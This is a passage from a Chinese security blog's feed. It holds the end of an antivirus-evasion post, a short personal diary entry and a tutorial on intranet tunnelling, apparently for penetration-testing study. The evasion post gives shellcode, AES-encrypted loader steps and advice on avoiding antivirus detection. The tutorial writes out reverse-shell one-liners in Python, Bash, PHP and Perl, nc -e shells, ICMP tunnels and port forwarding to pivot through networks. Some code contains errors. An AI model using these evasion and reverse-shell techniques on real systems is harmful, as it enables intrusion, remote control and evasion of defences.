class="string">b&quot;\xfc\xe8\x8f\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span></span><br><span class="line"><span class="built_in">str</span> = binascii.b2a_hex(buf).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure></li><li><p>Python中实现AES加解密<br>加密过程：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装第三方库 pip install pycryptodome</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line">source = <span class="string">&#x27;hello-abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果source不足16位的倍数就用\0补足为16位</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">add = <span class="number">16</span> - (<span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">add = <span class="number">0</span></span><br><span class="line">source = source + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line"><span class="built_in">print</span>(source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义密钥和偏移量，必须是16个字节、24个字节或32个字节</span></span><br><span class="line"><span class="comment"># key = &#x27;todayiswonderful-1234567&#x27;.encode()</span></span><br><span class="line">key = <span class="string">&#x27;todayiswonderful-FEDCBA987654321&#x27;</span>.encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = <span class="string">b&#x27;1234567890ABCDEF&#x27;</span></span><br><span class="line">cryptos = AES.new(key,mode,iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行加密处理</span></span><br><span class="line">cipher = cryptos.encrytpt(source.encode())</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 便于传播可以将其转换成16进制，结果为db86ba246ebdf73c8a3a8b26a98ecadf</span></span><br><span class="line"><span class="built_in">print</span>(b2a_hex(cipher).encode)</span><br></pre></td></tr></table></figure></li></ol><p>解密过程与加密过程相反即可</p><h3 id="加密加载器"><a href="#加密加载器" class="headerlink" title="加密加载器"></a>加密加载器</h3><ol><li><p>将加载器代码进行base64编码</p></li><li><p>将base64编码进行AES加密</p></li></ol><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>将加密后的shellcode和加载器放在同一个python文件里。<br>然后使用 <code>exec()</code> 函数执行加载器代码。</p><p>最后使用 <code>pyinstaller.exe</code> 将python文件打包为exe文件，执行命令为：<br><code>pythoninstaller.exe -Fw shellcode_run.py</code></p><p>注意：不能将变量命名为诸如shellcode, trojan, virus等敏感字词。以免被杀毒软件查杀。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.wangan.com/p/7fy7f690c41538bf">免杀技术有一套</a><br><a href="https://bbs.huaweicloud.com/blogs/396696">免杀基础原理及实践免杀</a><br><a href="https://github.com/TideSec/BypassAntiVirus">远控免杀专题</a><br><a href="https://cloud.tencent.com/developer/article/2207475">MSF CS通用免杀项目</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>而立</title>
    <link href="http://example.com/2023/08/30/Diary_20230830/"/>
    <id>http://example.com/2023/08/30/Diary_20230830/</id>
    <published>2023-08-29T16:00:00.000Z</published>
    <updated>2023-08-30T16:14:27.620Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为赶时间，就简单写写。</p><span id="more"></span><h1 id="包容度"><a href="#包容度" class="headerlink" title="包容度"></a>包容度</h1><p>大约有10天没写日记了，还是有点久了，一部分原因是我觉得没什么好写的，如果只是说几句话就算完了，有些空荡。另一部分是我懒，还记得自己说要强迫自己每天写日记，看来是没做到呢。</p><p>接下来便是我想谈的正题，由于各方面的原因，或许也可称为感悟之类的，突然在某一天，感觉自己的包容度上升了。<br>之前是怎样的呢？比如在某个地方见到有人回我评论是带有恶意的方式，我会回骂一句或直接拉黑，当然有时也只是不予理睬。<br>说这个不是想表明自己有多么嫉恶如仇，而是我常常带有一种蔑视的心理：如果某个人在某一方面的认知显得愚蠢，那么我就认为这不是值得对等交谈的人，而不屑与之相处。</p><p>但是近来，由于各种各样的原因，我渐渐能包容这些了。<br>即便有人发评论侮辱，我也能变得波澜不惊，更不会拉黑（顺带一提，我的b站黑名单已经满了）。</p><p>这么做，容易被人视为懦弱吧。</p><p>不过，这不是懦弱胆怯，这是一种包容。<br>既接受人的光辉一面，也容纳人的丑恶一面。<br>说着说着，有种“圣母”的感觉了。哈哈。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>写得不行，没把想表达的内容写出来，有些可惜。等下次有了充裕的时间再做表述吧。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为赶时间，就简单写写。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之隧道通信</title>
    <link href="http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    <id>http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</id>
    <published>2023-08-28T16:00:00.000Z</published>
    <updated>2023-08-30T08:11:50.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习+学习。</p><span id="more"></span><h1 id="隐藏通信隧道基础知识"><a href="#隐藏通信隧道基础知识" class="headerlink" title="隐藏通信隧道基础知识"></a>隐藏通信隧道基础知识</h1><h2 id="隐藏通信隧道概述"><a href="#隐藏通信隧道概述" class="headerlink" title="隐藏通信隧道概述"></a>隐藏通信隧道概述</h2><p>一般的网络通信，先在两台机器之间建立TCP连接，然后进行正常的数据通信。在知道IP地址的情况下，可以直接发送报文；如果不知道IP地址，就需要将域名解析成IP地址。在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接的情况，如果发现异常，就会对通信进行阻断。</p><p>这里的隧道，是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</p><p>常用隧道列举如下：</p><ul><li>网络层：ipv6隧道、ICMP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li></ul><h2 id="判断内网的连通性"><a href="#判断内网的连通性" class="headerlink" title="判断内网的连通性"></a>判断内网的连通性</h2><p>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议(TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、 443、53、110、123等。常用的内网连通性判断方法如下：</p><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">命令如下：</span><br><span class="line">ping &lt;IP地址和域名&gt;</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"></span><br><span class="line">Pinging www.xxx.com [198.18.0.106] with 32 bytes of data:</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line">Ping statistics for 198.18.0.106:</span><br><span class="line">    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),</span><br><span class="line">Approximate round trip times in milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br></pre></td></tr></table></figure><h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p>netcat （简称nc）被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。<br>使用nc工具，执行命令：<br><code>nc &lt;IP port&gt;</code><br>开启phpstudy前后：<br><img src="/simg/tunnel_1.png" alt=" "></p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>curl是一个利用URL规则在命令行下工作的综合文件传输工具，支持文件的上传和下载。curl命令不仅支持HTTP、HTTPS、FTP等众多协议，还支持POST、Cookie、 认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux 操作系统自带curl命令。在Windows操作系统中，需要下载并安装curl 命令。</p><p><code>curl &lt;ip:port&gt;</code></p><p>如果远程主机开启了相应的端口，会输出相应的端口信息。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p><h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>在进行DNS连通性检测时，常用的命令为nslookup和dig。</p><p>nslookup是Windows操作系统自带的DNS探测命令，其用法如下所示。在没有指定vps-ip时，nslookup会从系统网络的TCP&#x2F;IP属性中读取DNS服务器的地址。</p><p><code>nslookup www.xxx.com vps-ip</code></p><p>dig是Linux 默认自带的DNS探测命令，其用法如下所示。<br>在没有指定vps-ip时，dig 会到 <code>/etc/resolv.conf</code> 文件中读取系统配置的DNS服务器的地址。如果vps-ip 为192.168.43.1, 将解析xxx的IP地址，说明目前DNS协议是连通的。<br><code>dig @vps-ip www.xxx.com</code></p><p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下：</p><ul><li>查看网络连接，判断是否存在与其他机器的8080 (不绝对)等端口的连接(可以尝试运行 <code>ping -n 1 -a ip</code> 命令)。</li><li>查看内网中是否有主机名类似于“proxy” 的机器。</li><li>查看IE浏览器的直接代理。</li><li>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。</li><li>执行如下命令，利用curl工具进行确认。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.xxx.com  //不通</span><br><span class="line">curl -X proxy-ip:port www.xxx.com  //不通</span><br></pre></td></tr></table></figure></li></ul><h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="ipv6隧道技术简介"><a href="#ipv6隧道技术简介" class="headerlink" title="ipv6隧道技术简介"></a>ipv6隧道技术简介</h3><p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。为了在IPv4中传递IPv6信息，可以将IPv4作为隧道载体，将IPv6报文整体封装在IPv4数据报文中，使IPv6报文能够穿过IPv4，到达另一个IPv6程序。</p><p>因为现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。</p><p><img src="/simg/tunnel_2.png" alt=" "></p><p>有一点需要指出：即使设备支持IPv6，也可能无法正确分析封装了IPv6 报文的IPv4数据包。配置隧道和自动隧道的主要区别是：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时，如果采用的是自动隧道方法，就不需要进行配置。</p><p>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或他IPv4的配置机制。</p><p>支持IPv6的隧道工具有socat、6tunnel 、nt6tunnel 等。</p><h3 id="防御IPv6隧道攻击的方法"><a href="#防御IPv6隧道攻击的方法" class="headerlink" title="防御IPv6隧道攻击的方法"></a>防御IPv6隧道攻击的方法</h3><p>针对IPv6隧道攻击，最好的防御方法是：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信，提高主机和应用程序的安全性。</p><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用，是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相对应的回复与请求。</p><p>在一些网络环境中，如果攻击者使用各类上层隧道(例如HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等)进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP&#x2F;UDP数据封装到ICMP的ping数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping数据包)，实现不受限制的网络访问。</p><p>常用的ICMP隧道工具有icmpsh、PingTunnel 、icmptunnel、 powershell icmp等。</p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh工具使用简单，便于“携带”(跨平台),运行时不需要管理员权限。使用git clone命令下载icmpsh。<br><code>git clone https://github.com/inquisb/icmpsh.git</code></p><p>安装Python的impacket类库，以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。<br><code>pip install impacket</code></p><p>因为icmpsh工具要代替系统本身的ping命令的应答程序，输入如下命令来关闭本地系统的ICMP应答( 如果要恢复系统应答，则设置为0)，否则Shell的运行会不稳定(表现为一直刷屏，无法进行交互输入)。<br><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p><p>直接输入“.&#x2F;run.sh” 会抱错，输入如下命令运行工具：<br><code>python2 icmpsh_m.py 【kali主机地址】 【windows主机地址】 # 运行工具</code></p><p>查看kali攻击者IP地址(192.168.220.165)。然后输入如下命令。<br><code>icmpsh.exe -t 【kali主机地址】</code></p><p>在目标主机上运行以上命令后，即可在VPS中看到反弹的shell</p><h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a>PingTunnel</h3><p>PingTunnel也是一款常用的ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(windows7)：192.168.52.133</li></ul><p>首先，在需要建立ICMP隧道的两台机器(kali和Web服务器)上安装PingTunnel工具。 然后，输入如下命令，解压压缩文件，进行配置和编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line"><span class="built_in">cd</span> PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>但在安装前需要安装它的运行环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装libpcap的依赖环境</span></span><br><span class="line">apt-get install byacc</span><br><span class="line">apt-get install flex bison</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>使用方法：<br>在Web服务器192.168.220.145中输入如下命令，运行PingTunnel 工具,开启隧道。<br><code>ptunnel -x password</code></p><p>在kali机器192.168.220.165中执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.220.145 -lp 2333 -da 192.168.52.133 -dp 80 -x password</span><br><span class="line"></span><br><span class="line">-p   <span class="comment"># 指定ICMP隧道另一端的IP</span></span><br><span class="line">-lp  <span class="comment"># 指定本地监听的TCP端口</span></span><br><span class="line">-da  <span class="comment"># 指定要转发的目标机器的IP</span></span><br><span class="line">-dp  <span class="comment"># 指定要转发的目标机器的TCP端口</span></span><br><span class="line">-x   <span class="comment"># 指定连接密码</span></span><br></pre></td></tr></table></figure><p>上述命令的含义是：<br>在访问攻击者kali(192.168.220.165)的2333端口时，会把数据库服务器192.168.52.133的80端口的数据封装在ICMP隧道里，以Web服务器192.168.220.145为ICMP隧道跳板进行传送。</p><p><img src="/simg/tunnel_3.png" alt=" "></p><p>可以看到服务标识是windows7<br>如果内网机器是linux的可以连接22端口，如果是windows可以尝试3389端口</p><p><code>ptunnel -p 192.168.200.34 -lp 2333 -da 192.168.100.7 -dp 22 -x password</code></p><h3 id="防御ICMP隧道攻击的方法"><a href="#防御ICMP隧道攻击的方法" class="headerlink" title="防御ICMP隧道攻击的方法"></a>防御ICMP隧道攻击的方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向，ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p><ul><li>检测同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包。</li><li>注意那些Payload大于64bit的ICMP数据包。</li><li>寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包。</li><li>检查ICMP数据包的协议标签。例如，icmptunnel 会在所有的ICMP Payload 前面添加“TUNL”标记来标识隧道一这就是特征。</li></ul><h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。</p><h2 id="LCX端口转发"><a href="#LCX端口转发" class="headerlink" title="LCX端口转发"></a>LCX端口转发</h2><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe, Linux版为portmap。一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端；通过传入服务端的IP地址和端口，才能主动与服务器连接。</p><p><a href="https://github.com/Brucetg/Pentest-tools/tree/master/">下载地址</a></p><h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网VPS的4444端口上。<br><code>lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</code></p><p>在VPS上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555 端口上。<br><code>lcx.exe -listen 4444 5555</code></p><p>此时，用mstsc登录“&lt;公网主机IP地址&gt;:5555”，或者在VPS上用mstsc登录主机127.0.0.1的5555端口，即可访问目标服务器的3389端口。</p><h3 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h3><p>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口(例如53)。在目标主机上执行如下命令，就可以直接从远程桌面连接目标主机的53端口。<br><code>lcx -tran 53 &lt;目标主机IP地址&gt; 3389</code></p><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><h3 id="简易使用"><a href="#简易使用" class="headerlink" title="简易使用"></a>简易使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d：后台模式</span><br><span class="line">-e：程序重定向</span><br><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多可设置8个</span><br><span class="line">-G&lt;指向器数目&gt;：设置源路由指向器的数量，值为4的倍数</span><br><span class="line">-h：在线帮助</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口</span><br><span class="line">-l：使用监听模式，管理和控制传入的数据</span><br><span class="line">-n：直接使用IP地址(不通过域名服务器)</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据转换为十六进制字节码后保存在该文件中</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口</span><br><span class="line">-r：随机指定本地与远程主机的通信端口</span><br><span class="line">-s&lt;源地址&gt;：设置本地主机送出数据包的IP地址</span><br><span class="line">-u：使用UDP传输协议</span><br><span class="line">-v：详细输出</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间</span><br><span class="line">-z：将输入/输出功能关闭，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure><p>Banner抓取：<br><code>nc -nv 192.168.220.165 21</code></p><p>连接远程主机<br><code>nc -nvv 192.168.220.165 80</code></p><p>端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.220.165 80   扫描指定端口</span><br><span class="line">nc -v -z 192.168.220.165 20-1024   扫描端口段（速度慢）</span><br></pre></td></tr></table></figure><p>端口监听<br><code>nc -l -p 4444   当访问该端口时会输出该信息到命令行</code></p><p>文件传输</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444                               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 &lt; test.txt -q 1 发送方传输test.txt</span><br></pre></td></tr></table></figure><p>简易聊天</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 发送方</span><br></pre></td></tr></table></figure><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>Shell分为两种，一种是正向Shell，另一种是反向Shell。 如果客户端连接服务器，客户端想要获取服务器的Shell, 就称为正向Shell；如果客户端连接服务器，服务器想要获取客户端的Shell,就称为反向Shell。反向Shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。<br><strong>正向shell</strong><br>在目标主机中输入如下命令，监听目标主机的4444端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -1vp 4444 -e /bin/sh                     //Linux</span><br><span class="line">nc -lvp 4444 -e c:\\windows\\system32\\cmd.exe //Windows</span><br></pre></td></tr></table></figure><p>在kali攻击机输入如下命令，连接目标主机的4444端口<br><code>nc &lt;目标IP&gt; 4444</code></p><p>可以在目标主机上看到 目标IP 正在连接本机。</p><p><strong>反向shell</strong><br>kali攻击机输入如下命令，监听本地9999端口。<br><code>nc -lvp 9999</code></p><p>在目标主机中输入如下命令，连接VPS主机192.168.220.165 的9999端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.220.165 9999 -e /bin/sh                    //Linux</span><br><span class="line">nc 192.168.220.165 9999 -e C:\windows\system32\cmd.exe//Windows </span><br></pre></td></tr></table></figure><h3 id="在目标主机中没有nc时获取反向shell"><a href="#在目标主机中没有nc时获取反向shell" class="headerlink" title="在目标主机中没有nc时获取反向shell"></a>在目标主机中没有nc时获取反向shell</h3><p>在一般情况下，目标主机中是没有nc的。此时，可以使用其他工具和编程语言来代替nc，实现反向连接(下面的代码仅适用于目标主机为linux的情况)</p><p>(1) Python反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>在目标主机上执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((&quot;192.168.220.165&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>(2) Bash反弹shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>在目标主机上执行如下命令<br><code>bash -i &gt;&amp; /dev/tcp/192.168.220.165/4444 0&gt;&amp;1</code></p><p>(3) PHP反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>PHP常用在Web服务器上，它是nc、Perl 和Bash的一个很好的替代品。执行如下命令，实现PHP环境下的反弹Shell<br><code>php -r &#39;$sock=fsockopen(&quot;192.168.220.165,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>(4) Perl反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>如果此时目标主机使用的是Perl语言，仍然可以使用Perl来建立反向Shell。<br>在目标主机上运行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.220.165&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>假设有三台主机A、B和C，其中B、C在内网环境中。主机A访问B，并获取了B的Shell；A不能直接访问C，可以通过B访问C。现在要获取C的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在主机A：nc -lvp 4444</span><br><span class="line">在主机C：nc -lvp 9999 -e /bin/sh</span><br><span class="line">在主机B：nc -v &lt;主机A的IP地址&gt; 4444 -c <span class="string">&quot;nc -v &lt;主机C的IP地址&gt; 9999&quot;</span></span><br></pre></td></tr></table></figure><h2 id="PowerCat"><a href="#PowerCat" class="headerlink" 